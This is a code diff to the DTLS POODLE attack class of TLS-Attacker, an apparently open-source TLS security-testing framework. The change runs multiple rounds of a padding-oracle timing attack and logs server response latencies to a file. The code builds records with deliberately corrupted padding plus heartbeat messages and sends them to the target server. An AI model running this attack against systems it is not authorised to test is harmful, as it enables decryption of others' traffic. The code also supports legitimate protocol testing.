@@ -40,6 +40,7 @@ import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
 import de.rub.nds.tlsattacker.transport.TransportHandler;
 import de.rub.nds.tlsattacker.util.RandomHelper;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
@@ -62,13 +63,15 @@ public class DtlsPoodleAttack extends Attacker<DtlsPoodleCommandConfig> {
 
     private List<ProtocolMessage> protocolMessages;
 
+    private TransportHandler transportHandler;
+
     public DtlsPoodleAttack(DtlsPoodleCommandConfig config) {
 	super(config);
     }
 
     @Override
     public void executeAttack(ConfigHandler configHandler) {
-	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
+	transportHandler = configHandler.initializeTransportHandler(config);
 	tlsContext = configHandler.initializeTlsContext(config);
 	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
 	recordHandler = (RecordHandler) tlsContext.getRecordHandler();
@@ -79,53 +82,69 @@ public class DtlsPoodleAttack extends Attacker<DtlsPoodleCommandConfig> {
 
 	workflowExecutor.executeWorkflow();
 
+	FileWriter fileWriter = null;
+	Long[] latencyResult;
+	StringBuilder sb;
+
+	try {
+	    if (config.getResultFilePath() != null) {
+		fileWriter = new FileWriter(config.getResultFilePath(), true);
+	    }
+	    for (int i = 0; i < config.getNrOfRounds(); i++) {
+		latencyResult = executeAttackRound();
+
+		sb = new StringBuilder();
+		sb.append(latencyResult[0].toString());
+		sb.append("\t");
+		sb.append(latencyResult[1].toString());
+		sb.append("\n");
+		if (config.getResultFilePath() != null) {
+		    fileWriter.write(sb.toString());
+		}
+
+		// sb = new StringBuilder();
+		// sb.append(i);
+		// sb.append(" of ");
+		// sb.append(config.getNrOfRounds());
+		// sb.append(" rounds.\n");
+		// LOGGER.info(sb.toString());
+	    }
+	    if (config.getResultFilePath() != null) {
+		fileWriter.close();
+	    }
+	} catch (IOException e) {
+	    LOGGER.info(e.getLocalizedMessage());
+	}
+
+	closeDtlsConnectionGracefully();
+
+	transportHandler.closeConnection();
+    }
+
+    private Long[] executeAttackRound() throws IOException {
 	List<byte[]> attackTrain = createAttackMessageTrain(config.getTrainMessageSize(), config.getMessagesPerTrain(),
 		ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
 	List<byte[]> validTrain = createValidMessageTrain(config.getTrainMessageSize(), config.getMessagesPerTrain());
+	Long[] results = new Long[2];
 
-	try {
-	    for (byte[] record : attackTrain) {
-		transportHandler.sendData(record);
-	    }
-	} catch (IOException e) {
-	    LOGGER.error(e.getLocalizedMessage());
+	for (byte[] record : attackTrain) {
+	    transportHandler.sendData(record);
 	}
 
 	long startNanos = System.nanoTime();
-
-	try {
-	    transportHandler.fetchData();
-	} catch (IOException e) {
-	    LOGGER.error(e.getLocalizedMessage());
-	}
-
+	transportHandler.fetchData();
 	long endNanos = System.nanoTime();
+	results[0] = endNanos - startNanos;
 
-	LOGGER.info("Time taken for the server to respond (attack train):" + (endNanos - startNanos));
-
-	try {
-	    for (byte[] record : validTrain) {
-		transportHandler.sendData(record);
-	    }
-	} catch (IOException e) {
-	    LOGGER.error(e.getLocalizedMessage());
+	for (byte[] record : validTrain) {
+	    transportHandler.sendData(record);
 	}
 
 	startNanos = System.nanoTime();
-
-	try {
-	    transportHandler.fetchData();
-	} catch (IOException e) {
-	    LOGGER.error(e.getLocalizedMessage());
-	}
-
+	transportHandler.fetchData();
 	endNanos = System.nanoTime();
-
-	LOGGER.info("Time taken for the server to respond (valid train):" + (endNanos - startNanos));
-
-	closeDtlsConnectionGracefully(transportHandler);
-
-	transportHandler.closeConnection();
+	results[1] = endNanos - startNanos;
+	return results;
     }
 
     private List<byte[]> createAttackMessageTrain(int l, int n, VariableModification<byte[]> modifier) {
@@ -134,6 +153,7 @@ public class DtlsPoodleAttack extends Attacker<DtlsPoodleCommandConfig> {
 	byte[] messageData = new byte[l - 13];
 	ModifiableByteArray padding = new ModifiableByteArray();
 	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
+	protocolMessages.add(apMessage);
 	Record record;
 
 	padding.setModification(modifier);
@@ -149,6 +169,7 @@ public class DtlsPoodleAttack extends Attacker<DtlsPoodleCommandConfig> {
 	}
 
 	HeartbeatMessage hbMessage = new HeartbeatMessage();
+	protocolMessages.add(hbMessage);
 
 	messageData = hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage();
 	records.add(new Record());
@@ -163,6 +184,7 @@ public class DtlsPoodleAttack extends Attacker<DtlsPoodleCommandConfig> {
 	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
 	byte[] messageData = new byte[l - 13];
 	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
+	protocolMessages.add(apMessage);
 
 	RandomHelper.getRandom().nextBytes(messageData);
 	apMessage.setData(messageData);
@@ -174,6 +196,7 @@ public class DtlsPoodleAttack extends Attacker<DtlsPoodleCommandConfig> {
 	}
 
 	HeartbeatMessage hbMessage = new HeartbeatMessage();
+	protocolMessages.add(hbMessage);
 
 	messageData = hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage();
 	records.add(new Record());
@@ -183,7 +206,7 @@ public class DtlsPoodleAttack extends Attacker<DtlsPoodleCommandConfig> {
 	return train;
     }
 
-    private void closeDtlsConnectionGracefully(TransportHandler transportHandler) {
+    private void closeDtlsConnectionGracefully() {
 	AlertMessage closeNotify = new AlertMessage();
 	closeNotify.setConfig(AlertLevel.FATAL, AlertDescription.CLOSE_NOTIFY);
 	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
